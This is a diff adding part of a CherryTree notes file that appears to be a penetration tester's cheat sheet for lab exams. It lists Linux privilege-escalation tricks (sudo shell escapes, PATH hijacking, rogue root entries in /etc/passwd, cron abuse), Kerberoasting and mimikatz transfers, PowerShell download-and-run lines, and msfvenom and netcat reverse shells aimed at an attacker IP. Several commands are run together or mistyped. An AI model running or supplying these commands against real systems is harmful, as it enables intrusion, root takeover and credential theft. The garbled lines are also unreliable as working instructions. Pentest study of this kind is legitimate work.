+    <rich_text scale="h2"># Create fake cat</rich_text>
+    <rich_text>
+echo "/bin/bash" &gt; /tmp/cat
+chmod 777 /tmp/cat
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+</rich_text>
+    <rich_text scale="h2"># Update PATH</rich_text>
+    <rich_text>
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+</rich_text>
+    <rich_text scale="h2"># Go to root</rich_text>
+    <rich_text>
+cd /root
+/usr/sbin/cat .flag.txt
+</rich_text>
+    <rich_text scale="h2"># listinfo through date binary</rich_text>
+    <rich_text>
+cd /tmp
+echo "/bin/sh" &gt; date
+chmod 777 date
+echo $PATH
+export PATH=/tmp:$PATH
+/usr/bin/listinfo
+Chrootkit 
+</rich_text>
+    <rich_text scale="h2"># Chrootkit</rich_text>
+    <rich_text>
+chrootkit -V
+</rich_text>
+    <rich_text scale="h2"># Then Google / MSF</rich_text>
+    <rich_text>
+Capabilities 
+</rich_text>
+    <rich_text scale="h2"># Capabilities</rich_text>
+    <rich_text>
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
+getcap -r / 2&gt;/dev/null
+</rich_text>
+    <rich_text scale="h2"># TAR can read all files, so you can create a tar with a wanted file and than extract it</rich_text>
+    <rich_text>
+tar -cvf shadow.tar "/etc/shadow"
+tar -xvf shadow.tar
+ 
+ 
+cat /etc/shadow
+
+</rich_text>
+    <rich_text scale="h2">Exploiting sudo </rich_text>
+    <rich_text>
+BINARY PROGRAM
+COMMANDS
+INFOS
+apache2
+sudo apache2 -f /etc/shadow
+# You will get an error and it will # display first line
+apt-get
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+
+</rich_text>
+    <rich_text scale="h2">awk</rich_text>
+    <rich_text>
+sudo awk ‘BEGIN {system(“/bin/sh”)}’
+
+
+</rich_text>
+    <rich_text scale="h2">ed</rich_text>
+    <rich_text>
+sudo /usr/bin/ed !/bin/sh
+
+
+</rich_text>
+    <rich_text scale="h2">find</rich_text>
+    <rich_text>
+sudo find /etc/passwd -exec /bin/sh \; sudo find /bin -name nano -exec /bin/sh \;
+
+
+</rich_text>
+    <rich_text scale="h2">ftp</rich_text>
+    <rich_text>
+sudo ftp ftp&gt; /!/bin/bash
+
+
+</rich_text>
+    <rich_text scale="h2">gdb</rich_text>
+    <rich_text>
+sudo -u user gdb -q (gdb) shell
+
+
+</rich_text>
+    <rich_text scale="h2">git</rich_text>
+    <rich_text>
+# Method 1 sudo -u user git -c core.pager=/tmp/script.sh –paginate help # Method 2 sudo git help add !/bin/bash
+# Method 1 Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2 # Method 2 You can also use the help add feature
+ht
+export TERM=xterm-color sudo ht /etc/sudoers # F3 to open the file, then update lines ALL=(ALL) NOPASSWD: ALL
+
+
+</rich_text>
+    <rich_text scale="h2">less</rich_text>
+    <rich_text>
+sudo less /etc/hosts !sh
+
+
+</rich_text>
+    <rich_text scale="h2">man</rich_text>
+    <rich_text>
+sudo man man !sh
+
+
+</rich_text>
+    <rich_text scale="h2">more</rich_text>
+    <rich_text>
+sudo more /etc/hosts !sh
+
+
+</rich_text>
+    <rich_text scale="h2">mount</rich_text>
+    <rich_text>
+sudo mount -o bind /bin/bash /bin/mount sudo mount
+
+
+</rich_text>
+    <rich_text scale="h2">mysql</rich_text>
+    <rich_text>
+sudo mysql -e ‘!/bin/sh’
+
+
+</rich_text>
+    <rich_text scale="h2">nano</rich_text>
+    <rich_text>
+sudo nano /etc/passwd
+# You can then add a new root user openssl passwd -1 -salt user3 pass123 # /etc/passwd user3::0:0:root:/root:/bin/bash
+
+</rich_text>
+    <rich_text scale="h2">nmap</rich_text>
+    <rich_text>
+# Method 1 sudo nmap –interactive nmap&gt; !sh # Method 2 echo “os.execute(‘/bin/sh’)” &gt; /tmp/shell.nse &amp;&amp; sudo nmap –script=/tmp/shell.nse
+# Method 1 # Using –interactive option # Method 2 # Using –script option
+
+</rich_text>
+    <rich_text scale="h2">pico</rich_text>
+    <rich_text>
+sudo -u user pico
+# Type bash in editor an press ^T to # trigger spellchecker
+
+</rich_text>
+    <rich_text scale="h2">pip</rich_text>
+    <rich_text>
+python -m SimpleHTTPServer 80 wget http://192.168.1.134/setup.py sudo pip install . –upgrade –force-reinstall
+# You can use FakePip https://github.com/0x00-0x00/FakePip.git # Decode and change IP adress
+
+</rich_text>
+    <rich_text scale="h2">rbash</rich_text>
+    <rich_text>
+echo $SHELL echo $PATH export SHELL=/bin/bash:$SHELL export PATH=/usr/bin:$PATH vi :!/bin/bash
+
+
+</rich_text>
+    <rich_text scale="h2">rvim</rich_text>
+    <rich_text>
+rvim version
+grep python echo “import os;os.system(‘bash’)” &gt; /tmp/script.py sudo -u rvim -c “pyfile /tmp/script.py”
+
+</rich_text>
+    <rich_text scale="h2">scp</rich_text>
+    <rich_text>
+sudo -u user scp -vv -C -S tmp/script.sh a whatever
+# Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2
+
+</rich_text>
+    <rich_text scale="h2">script</rich_text>
+    <rich_text>
+sudo -u user script /tmp/what-ever
+
+
+</rich_text>
+    <rich_text scale="h2">ssh</rich_text>
+    <rich_text>
+sudo -u user ssh -o ProxyCommand=/tmp/script.sh lel
+# Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2
+strace / sysud64
+sudo strace -o/dev/null /bin/bash sudo sysud64 -o/dev/null /bin/bash
+
+
+</rich_text>
+    <rich_text scale="h2">tar</rich_text>
+    <rich_text>
+# Method 1 sudo -u user tar –checkpoint=1 –checkpoint-action=exec=/bin/bash -cf /tmp/12345.tar /dev/zero # Method 2 cd /tmpcp /bin/bash . sudo chown root:root /tmp/bash sudo mv /bin/tar /bin/tar.bak sudo mv /tmp/bash /bin/tar sudo /bin/tar
+
+
+</rich_text>
+    <rich_text scale="h2">tcpdump</rich_text>
+    <rich_text>
+echo $’id\ncat /etc/shadow’ &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+
+</rich_text>
+    <rich_text scale="h2">teehee</rich_text>
+    <rich_text>
+echo “raaj::0:0:::/bin/bash”
+sudo teehee -a /etc/passwd
+vim
+sudo vim -c ‘!sh’
+
+
+</rich_text>
+    <rich_text scale="h2">wget</rich_text>
+    <rich_text>
+sudo wget http://ip/filePasswd -O /etc/passwd su user1
+# Attacker side # Copy target’s file /etc/passwd # Add a new user and host the fil
+zip
+# Method 1 touch /tmp/xyz; chmod 444 /tmp/xyz sudo -u user zip /tmp/zzz.zip /tmp/xyz -T -TT /tmp/script.sh # Method 2 touch raj sudo zip /tmp/nisha.zip /home/zico/raj -T –unzip-command=“sh -c /bin/bash”
+# Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2
+
+
+</rich_text>
+    <rich_text scale="h2">/usr/bin/cp </rich_text>
+    <rich_text>
+# cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them
+cp /etc/shadow /tmp
+# generate new account
+openssl passwd -1 -salt username password
+# Then create a fake /etc/passwd file, upload it to the target and cp
+wget http://192.168.1.111:8000/passwd
+cp passwd /etc/passwd
+
+</rich_text>
+    <rich_text scale="h2">/usr/bin/doas </rich_text>
+    <rich_text>
+# doas
+cat /etc/doas.conf
+doas /usr/bin/less /var/log/authlog
+# Press v to escape vi then
+:!sh
+
+</rich_text>
+    <rich_text scale="h2">/usr/bin/find </rich_text>
+    <rich_text>
+# find
+touch raj
+find raj -exec "whoami" \;
+find raj -exec "/bin/sh" \;
+
+</rich_text>
+    <rich_text scale="h2"># another method</rich_text>
+    <rich_text>
+find /home –exec chmod u+s /usr/bin/wget \;
+ls –la /usr/bin/wget
+cat /etc/passwd
+# then create another etc/passwd file and upload it
+
+</rich_text>
+    <rich_text scale="h2">/usr/bin/micro </rich_text>
+    <rich_text>
+# micro editor
+cat /etc/passwd | /usr/bin/micro
+
+# Then generate another user
+openssl passwd -1 -salt user3 pass123
+
+</rich_text>
+    <rich_text scale="h2">/usr/bin/mawk </rich_text>
+    <rich_text>
+# mawk
+mawk 'BEGIN {system("/bin/sh")}'
+
+Tar wildcard + root cron 
+# If a privilegied script is used to backup something or just uses tar * in a folder you have write access
+# You can exploit it to gain root access
+
+# Create 3 files in the folder
+touch -- "--checkpoint=1"
+touch -- “--checkpoint-action=exec=sh\ shell.sh”
+touch shell.sh
+
+# Then put your payload in the shell.sh script (#!/bin/sh)
+cat /etc/shadow &gt; outfile.txt
+
+</rich_text>
+    <rich_text scale="h2">Exploiting crontab </rich_text>
+    <rich_text>
+# If a script is running with higher privileges
+echo "cat /challenge/app-script/ch4/.passwd &gt;/tmp/cracked" &gt; cron.d/go &amp;&amp; chmod a+x cron.d/go &amp;&amp; sleep 60 &amp;&amp; cat /tmp/cracked
+
+# Get user ID
+cat /etc/passwd | grep shell4cracked
+
+# C program to get a shell
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setresuid(1028, 1028, 1028);
+    setresuid(1028, 1028, 1028);  
+    system("/bin/bash");
+    return 0;
+}
+
+# Compile and prepare
+gcc -o /tmp/pwned /tmp/._cron/shell.c
+chmod +s /tmp/pwned   
+chmod a+rwx /tmp/pwned
+
+Writable CRON directory 
+# In /tmp 
+# LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping
+# since it won't find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable
+# Then insert payload inside to create suid root program in /tmp
+printf “***** root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exmploit\n” &gt; /etc/cron.d/exploit
+cat /etc/cron.d/exploit
+ll
+./exploit
+whoami
+# New crontab
+touch /tmp/test
+/usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/test
+echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWORD:ALL" &gt;&gt; /etc/sudoers' &gt; /etc/cron.hourly/test
+chmod +x /etc/cron.hourly/test
+cat /etc/chron.hourly/test
+
+</rich_text>
+    <rich_text scale="h2">Website Links</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</rich_text>
+    <rich_text> (Windows)
+</rich_text>
+    <rich_text link="webs https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</rich_text>
+    <rich_text> (Linux)
+</rich_text>
+    <rich_text link="webs https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</rich_text>
+    <rich_text> (Windows)
+</rich_text>
+    <rich_text link="webs https://guif.re/linuxeop#Post%20exploitation">Linux elevation of privileges (guif.re)</rich_text>
+    <rich_text> (Linux)
+</rich_text>
+    <rich_text link="webs https://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/">User Account Control – What Penetration Testers Should Know - Cobalt Strike Research and Development</rich_text>
+    <rich_text> (UAC Bypass)
+</rich_text>
+    <rich_text link="webs https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/">Bypassing default UAC settings manually | Ivan's IT learning blog (wordpress.com)</rich_text>
+    <rich_text> (Manual UAC Bypass)
+</rich_text>
+  </node>
+  <node name="Nmap" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633113230" ts_lastsave="1633297563">
+    <rich_text scale="h2">Quick Tcp Scan:</rich_text>
+    <rich_text>
+nmap -vv --reason -Pn -sV -sC --version-all 10.1.1.27
+
+</rich_text>
+    <rich_text scale="h2">Full Tcp Scan:</rich_text>
+    <rich_text>
+nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.1.1.27
+
+</rich_text>
+    <rich_text scale="h2">Quick Tcp Scan for Lab Machines with too many open ports:</rich_text>
+    <rich_text>
+nmap -vv -Pn -sV --top-ports=20 -sT 10.1.1.27
+
+</rich_text>
+    <rich_text scale="h2">Subnet Scan:</rich_text>
+    <rich_text>
+sudo nmap -sP 192.168.0.1/24
+
+
+</rich_text>
+    <rich_text scale="h2">DNS Scan:</rich_text>
+    <rich_text>
+How to find the DNS server address on a private network:
+nmap -p 53 -sV 10.11.1.0-252 (sV stand for service detection)
+you test the dns addresses by running the following:
+nmap &lt;target ip address&gt;-sL --dns-servers &lt;dns server ip address&gt;
+nmap 10.11.1.71 -p- -sV --reason --dns-server 6.1.7601
+More info:  DNS Resolution | Nmap Network Scanning
+</rich_text>
+  </node>
+  <node name="Listeners" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633113340" ts_lastsave="1633349214">
+    <rich_text scale="h3">Netcat Listener:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nc -lnvp 4444</rich_text>
+    <rich_text>
+
+(If you believe that netcat is the culprit, you can use telnet instead)
+</rich_text>
+  </node>
+  <node name="Hashes" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1632922907" ts_lastsave="1633296134">
+    <rich_text scale="small">hashcat -m {format} {file}.txt /usr/share/wordlists/rockyou.txt</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">If you want to find format numerical identifiers, use this link:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text underline="single" link="webs https://hashcat.net/wiki/doku.php?id=example_hashes" scale="small" foreground="#1155cc">example_hashes [hashcat wiki]</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">john {file}.txt --wordlist=/usr/share/wordlists/rockyou.txt</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">To see decrypted hashes, use this command:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">john {file}.txt --wordlist=/usr/share/wordlists/rockyou.txt --show</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">To identify the hash, run this command:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">kali@kali hash-id</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">kali@kali {input the hash}</rich_text>
+    <rich_text>
+</rich_text>
+  </node>
+  <node name="File Transfers" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633296134" ts_lastsave="1633296964">
+    <rich_text scale="h2">Windows:</rich_text>
+    <rich_text>
+File Transfers via Certutil (need a python web server beforehand)
+1. certutil -urlcache -split -f "http://192.168.119.203:8000/mimikatzx64noerror.exe" c:\Users\Administrator\Desktop\mimikatzx64noerror.exe
+
+2. curl -O http://192.168.119.203:8000/linpeas.sh
+
+3. kali@kali: sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/ 
+kali@kali:~$ ls /ftphome/ nc.exe 
+kali@kali:~$ sudo systemctl restart pure-ftpd
+C:\Users\sqlServer\Desktop&gt; echo open 192.168.119.203 21 &gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo USER kali&gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo gogojuice56&gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo bin &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/nc.exe &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/zero2hero/bypassuac.exe &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/privilege_escalation/SysinternalsSuite/PsExec64.exe &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/SharpHound.exe &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/FodHelperBypass.ps1 &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/privilege_escalation/sherlock_privesc_check_win/Sherlock.ps1 &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/privilege_escalation/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe&gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/active_directory/mimikatzx64noerror.exe&gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/active_directory/Invoke-Kerberoast.ps1&gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/active_directory/Spray-Passwords.ps1&gt;&gt; ftp.txt
+ 
+C:\Users\sqlServer\Desktop&gt; echo GET /ftphome/active_directory/GetUserSPNs.ps1 &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\Doc1.doc &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\0-60a10000-svclient08$@krbtgt~SVCORP.COM-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\2-40a50000-svclient08$@HTTP~svMSSQL.svcorp.com-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\3-40a50000-svclient08$@ldap~sv-dc01.svcorp.com~ForestDnsZones.svcorp.com-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\4-40a50000-svclient08$@cifs~sv-dc01.svcorp.com~svcorp.com-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\5-40a10000-svclient08$@SVCLIENT08$-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo PUT c:\Users\Administrator\Desktop\0-60a10000-svclient08$@krbtgt~SVCORP.COM-SVCORP.COM.kirbi &gt;&gt; ftp.txt
+C:\Users\sqlserver\Desktop&gt; echo PUT c:\Users\alice\Desktop\20210824221738_BloodHound.zip &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; echo bye &gt;&gt; ftp.txt
+C:\Users\sqlServer\Desktop&gt; ftp -v -n -s:ftp.txt
+
+To upload/download a file from linux to QWindows XP and older, run these commands:
+kali@kali:~$ sudo apt update &amp;&amp; sudo apt install atftp 
+kali@kali:~$ sudo mkdir /tftp 
+kali@kali:~$ sudo chown nobody: /tftp 
+kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
+C:\Users\Offsec&gt; tftp -i 192.168.119.203 put daisy.rdp
+C:\Users\Offsec&gt; tftp -i 192.168.119.203 get Sherlock.ps1
+C:\Users\Offsec&gt; tftp -i 192.168.119.203 get windows-privesc-check2.exe
+C:\Users\Offsec&gt; tftp -i 192.168.119.203 get winPEASx86.exe
+C:\Users\Offsec&gt; tftp -i 192.168.119.203 get nc.exe
+
+To upload file windows 2008 and newer to linux, run these commands:
+C:\Users\Offsec&gt; powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.203/upload.php’, ‘ftp.txt’)
+
+powershell -ep bypass -c "(Invoke-WebRequest -Uri http://192.168.119.203:8000/active_directory/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1) ; .\Invoke-Kerberoast.ps1 -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt"
+
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.203:8000/active_directory/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+
+powershell -ep bypass -c "(Invoke-WebRequest -Uri http://192.168.119.203:8000/active_directory/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1) ; .\Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.kirbi"
+
+powershell -c “(Invoke-WebRequest -Uri http://192.168.119.203:8000/mimikatz_trunk.zip -OutFile mimikatz_trunk.zip)”
+
+</rich_text>
+    <rich_text scale="h2">Linux:</rich_text>
+    <rich_text>
+curl -O http://192.168.119.203:8000/linpeas.sh
+
+wget “http://192.168.119.203”</rich_text>
+  </node>
+  <node name="Reverse Shells" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1632922935" ts_lastsave="1633369519">
+    <rich_text scale="h2">To upgrade shell</rich_text>
+    <rich_text>:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+To set a webserver to host a shell script, run the following commands:
+kali@kali mkdir www
+kali@kali cd www
+kali@kali nano poc.php
+kali@kali python3 -m http.server
+
+</rich_text>
+    <rich_text scale="h2">To list msfvenom payloads:</rich_text>
+    <rich_text>
+msfvenom -l payloads tp list payloads
+
+</rich_text>
+    <rich_text scale="h2">Web Applications: </rich_text>
+    <rich_text>
+**replace ip address with {address} and port with {port}**
+
+</rich_text>
+    <rich_text scale="h2">PHP:</rich_text>
+    <rich_text>
+msfvenom -p php/reverse_php LHOST=192.168.119.203 LPORT=4445 -f raw -o shell.php
+
+</rich_text>
+    <rich_text scale="h2">HTTPMicrosoft Web Server:</rich_text>
+    <rich_text>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f asp -o rev6.asp
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f aspx -o rev5.aspx
+
+</rich_text>
+    <rich_text scale="h2">Microsoft HTTPD IIS Server:</rich_text>
+    <rich_text>
+msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=tun0 LPORT=443 -f asp -o bob3.asp
+(aspx files are executable on http microsoft web servers)
+
+</rich_text>
+    <rich_text scale="h2">Services hosted on a Windows server:</rich_text>
+    <rich_text>
+msfvenom -p windows/reverse_tcp LHOST=192.168.119.203 LPORT=4445 -f exe -o  revshell.exe
+
+</rich_text>
+    <rich_text scale="h2">Other:</rich_text>
+    <rich_text>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.203 LPORT=4444 -f raw -o shell.jsp
+*Make sure that you are using the right shell architecture (x64 or x86) 
+
+</rich_text>
+    <rich_text link="webs https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet | pentestmonkey</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Note: </rich_text>
+    <rich_text scale="h3" weight="heavy">so asp and aspx for microsoft web server IIS, php for php web apps, exe for general windows stuff, jsp for java web apps ?(edited)</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">Staged Payload:</rich_text>
+    <rich_text>
+Staged payloads are denoted with the use of a forward slash (/; e.g. windows/shell/reverse_tcp). Staged payloads send a small stager to the target, which connects back to the attacker and downloads the rest of the payload. Therefore, staged payloads need special payload listeners, such as multi/handler in Metasploit. Staged payloads are ideal in situations where you have limited shellcode space, most commonly in Buffer Overflows (but that’s a story for another day).
+
+</rich_text>
+    <rich_text scale="h2">Stageless Payloads:</rich_text>
+    <rich_text>
+Stageless payloads are denoted with the use of an underscore (_; e.g. windows/shell_reverse_tcp). Stageless payloads send the entire payload to the target at once, and therefore don’t require the attacker to provide more data. 
+
+</rich_text>
+    <rich_text scale="h2">MSSQL:</rich_text>
+    <rich_text>
+python3 sql_shell.py (need MSSQL credentials)
+
+</rich_text>
+    <rich_text scale="h2">Webconsole:</rich_text>
+    <rich_text>
+kali@kali nc -lnvp 443
+luigi@webconsole nc 192.168.119.203 443 -e /bin/bash
+
+
+</rich_text>
+    <rich_text link="webs https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py">https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py</rich_text>
+    <rich_text> 
+</rich_text>
+  </node>
+  <node name="Kali Linux" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633294384" ts_lastsave="1633297323">
+    <rich_text>kali@kali service start apache2
+kali@kali ./ngrok http 80
+
+If sudo systemctl start apache2 not working, then try:
+ps aux | grep rinetd
+sudo kill 1868
+
+To set a webserver to host a shell script, run the following commands:
+kali@kali mkdir www
+kali@kali cd www
+kali@kali nano poc.php
+kali@kali python3 -m http.server
+</rich_text>
+  </node>
+  <node name="Powershell" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633294405" ts_lastsave="1633296843">
+    <rich_text>When attempting to use Powershell, always run the program as administrator and run Set-ExecutionPolicy Unrestricted
+
+To unzip files using powershell:
+Expand-Archive -LiteralPath &lt;PathToZipFile&gt; -DestinationPath &lt;PathToDestination&gt;
+</rich_text>
+  </node>
+</cherrytree>
